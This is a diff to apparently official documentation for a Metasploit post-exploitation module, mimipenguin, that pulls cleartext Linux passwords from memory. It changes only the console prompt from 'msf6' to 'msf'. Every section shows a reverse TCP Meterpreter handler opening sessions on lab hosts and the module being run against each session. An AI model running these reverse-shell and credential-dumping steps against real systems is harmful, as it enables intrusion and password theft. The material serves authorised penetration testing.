@@ -21,7 +21,7 @@ This currently searches for passwords in `gnome-keyring-daemon`, `gdm-password`,
 ### Ubuntu 22.04 x64
 
 ```
-msf6 exploit(multi/handler) > run
+msf exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 192.168.140.1:4444
 [*] Sending stage (3020772 bytes) to 192.168.140.140
@@ -37,10 +37,10 @@ BuildTuple   : x86_64-linux-musl
 Meterpreter  : x64/linux
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use post/linux/gather/mimipenguin
-msf6 post(linux/gather/mimipenguin) > set session 1
+msf exploit(multi/handler) > use post/linux/gather/mimipenguin
+msf post(linux/gather/mimipenguin) > set session 1
 session => 1
-msf6 post(linux/gather/mimipenguin) > run
+msf post(linux/gather/mimipenguin) > run
 
 [!] SESSION may not be compatible with this module:
 [!]  * missing Meterpreter features: stdapi_railgun_api
@@ -65,7 +65,7 @@ Credentials
 ### Ubuntu 21.04 x64
 
 ```
-msf6 exploit(multi/handler) > run
+msf exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 192.168.140.1:4444
 [*] Sending stage (3020772 bytes) to 192.168.140.131
@@ -81,10 +81,10 @@ BuildTuple   : x86_64-linux-musl
 Meterpreter  : x64/linux
 meterpreter > background
 [*] Backgrounding session 2...
-msf6 exploit(multi/handler) > previous
-msf6 post(linux/gather/mimipenguin) > set session 2
+msf exploit(multi/handler) > previous
+msf post(linux/gather/mimipenguin) > set session 2
 session => 2
-msf6 post(linux/gather/mimipenguin) > run
+msf post(linux/gather/mimipenguin) > run
 
 [!] SESSION may not be compatible with this module:
 [!]  * missing Meterpreter features: stdapi_railgun_api
@@ -110,7 +110,7 @@ Credentials
 ### Fedora 27 x64
 
 ```
-msf6 exploit(multi/handler) > run
+msf exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 192.168.140.1:4444
 [*] Sending stage (3020772 bytes) to 192.168.140.165
@@ -118,10 +118,10 @@ msf6 exploit(multi/handler) > run
 
 meterpreter > background
 [*] Backgrounding session 3...
-msf6 exploit(multi/handler) > previous
-msf6 post(linux/gather/mimipenguin) > set session 3
+msf exploit(multi/handler) > previous
+msf post(linux/gather/mimipenguin) > set session 3
 session => 3
-msf6 post(linux/gather/mimipenguin) > run
+msf post(linux/gather/mimipenguin) > run
 
 [!] SESSION may not be compatible with this module:
 [!]  * missing Meterpreter features: stdapi_railgun_api
@@ -147,9 +147,9 @@ Credentials
 ### Ubuntu 14.04.1 x86
 
 ```
-msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
 payload => linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > run
+msf exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 192.168.140.1:4444
 [*] Sending stage (989032 bytes) to 192.168.140.135
@@ -165,10 +165,10 @@ BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 meterpreter > background
 [*] Backgrounding session 4...
-msf6 exploit(multi/handler) > previous
-msf6 post(linux/gather/mimipenguin) > set session 4
+msf exploit(multi/handler) > previous
+msf post(linux/gather/mimipenguin) > set session 4
 session => 4
-msf6 post(linux/gather/mimipenguin) > run
+msf post(linux/gather/mimipenguin) > run
 
 [!] SESSION may not be compatible with this module:
 [!]  * missing Meterpreter features: stdapi_railgun_api
